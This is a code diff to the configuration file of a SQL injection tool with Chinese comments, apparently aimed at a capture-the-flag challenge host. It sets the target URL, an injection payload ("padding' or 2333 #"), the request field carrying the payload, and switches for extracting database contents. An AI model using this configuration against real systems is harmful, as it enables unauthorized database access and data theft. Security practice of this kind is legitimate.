@@ -10,7 +10,7 @@ class BaseConfig:
         基类初始化，整个注入工具的核心配置
         """
         # 目标url
-        self.url = 'http://demo.lorexxar.pw/post.php'
+        self.url = 'http://huashan.xdsec.cn/62dd8d15b361f0f441e7/06acad5e2754f7e96d64/'
 
         # 请求头参数
         # cookies = {"username":data,"path":"/admin/","domain":"451bf8ea3268360ee.jie.sangebaimao.com"}
@@ -46,15 +46,15 @@ class BaseConfig:
         eg: self.payload = "padding' && 2333 #"
 
         """
-        self.payload = "padding' && 2333 #"
+        self.payload = "padding' or 2333 #"
 
         """
         配置请求,把请求中payload的位置设置为Feigong（如果拼错了就会全部无效...）
         self.requesetformat = "user=Feigong&passwd=ddog123&submit=Log+In"
         self.requesetformat = {"user": "Feigong", "password": "a"}
         """
-        # self.requesetformat = "user=Feigong&passwd=ddog123&submit=Log+In"
-        self.requesetformat = {"user": "Feigong", "password": "a"}
+        # self.requesetformat = "username=321&password=ddog123&submit=123&role=Feigong"
+        self.requesetformat = {"username": "321", "password": "ddog123", "submit": "123", "role": "Feigong"}
 
         """
         在注入之前，你首先需要测试，test.py中包含所有的测试函数，包括test、get_now_database、get_version、get_user
@@ -68,8 +68,8 @@ class BaseConfig:
         self.testmethod = {
             "test": 0,
             "database": 1,
-            "version": 1,
-            "user": 1
+            "version": 0,
+            "user": 0
         }
         """
         正式注入模式的选择，test模式开启时，无论正式注入模式是否开启都无效，默认开启
@@ -85,7 +85,7 @@ class BaseConfig:
 
         self.sqlilocation = {
             "content": 1,
-            "columns": 1,
-            "tables": 1,
-            "database": 1
+            "columns": 0,
+            "tables": 0,
+            "database": 0
         }
